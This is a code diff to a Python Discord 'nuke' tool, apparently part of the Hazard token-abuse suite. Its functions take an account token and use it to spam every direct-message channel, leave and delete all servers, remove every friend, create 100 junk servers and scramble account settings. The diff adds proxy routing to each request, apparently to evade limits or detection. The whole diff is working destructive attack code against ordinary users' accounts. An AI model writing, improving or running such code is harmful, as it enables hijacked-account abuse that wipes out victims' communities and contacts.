@@ -10,7 +10,7 @@ import random
 from itertools import cycle
 from colorama import Fore
 
-from util.plugins.common import print_slow, setTitle, getheaders
+from util.plugins.common import print_slow, setTitle, getheaders, proxy
 
 def Hazard_Nuke(token, Server_Name, message_Content):
     setTitle("Deploying Hazardous Nuke")
@@ -23,7 +23,8 @@ def Hazard_Nuke(token, Server_Name, message_Content):
     channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
     for channel in channelIds:
         try:
-            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
+            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
+            proxies={"ftp": f'{proxy()}'},
             headers=headers,
             data={"content": f"{message_Content}"})
             setTitle(f"Messaging "+channel['id'])
@@ -32,31 +33,28 @@ def Hazard_Nuke(token, Server_Name, message_Content):
             print(f"The following error has been encountered and is being ignored: {e}")
     print(f"{Fore.RED}Sent a Message to all available friends.{Fore.RESET}\n")
     
-    guildsIds = requests.get("https://discord.com/api/v7/users/@me/guilds", headers=getheaders(token)).json()
+    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
     for guild in guildsIds:
         try:
             requests.delete(
-                f'https://discord.com/api/v7/users/@me/guilds/'+guild['id'],
-                headers=getheaders(token))
-            setTitle(f"Leaving guild: "+guild['name'])
+                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
             print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-            
+
     for guild in guildsIds:
         try:
-            requests.delete(f'https://discord.com/api/v7/guilds/'+guild['id'], headers=getheaders(token))
-            setTitle(f"Deleting guild: "+guild['name'])
+            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
             print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
     print(f"{Fore.YELLOW}Deleted/Left all available guilds.{Fore.RESET}\n")
 
-    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
+    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
     for friend in friendIds:
         try:
             requests.delete(
-                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
+                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
             setTitle(f"Removing friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
             print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
         except Exception as e:
@@ -66,13 +64,14 @@ def Hazard_Nuke(token, Server_Name, message_Content):
     for i in range(100):
         try:
             payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
-            requests.post('https://discord.com/api/v7/guilds', headers=getheaders(token), json=payload)
+            requests.post('https://discord.com/api/v7/guilds', proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=payload)
             setTitle(f"Creating {Server_Name} #{i}")
             print(f"{Fore.BLUE}Created {Server_Name} #{i}.{Fore.RESET}")
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
     print(f"{Fore.BLUE}Created all servers.{Fore.RESET}\n")
     t.do_run = False
+    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
     setting = {
           'theme': "light",
           'locale': "ja",
@@ -88,8 +87,8 @@ def Hazard_Nuke(token, Server_Name, message_Content):
           'explicit_content_filter': '0',
           'status': "idle"
     }
-    requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
-    j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
+    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)
+    j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
     a = j['username'] + "#" + j['discriminator']
     setTitle(f"Hazard Nuke Successfully Detonated!")
     print_slow(f"{Fore.LIGHTGREEN_EX}Succesfully turned {a} into a Hazardous Wasteland ")
@@ -104,4 +103,4 @@ def CustomSeizure(token):
         modes = cycle(["light", "dark"])
         #cycle between light/dark mode and languages
         setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
-        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
+        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)
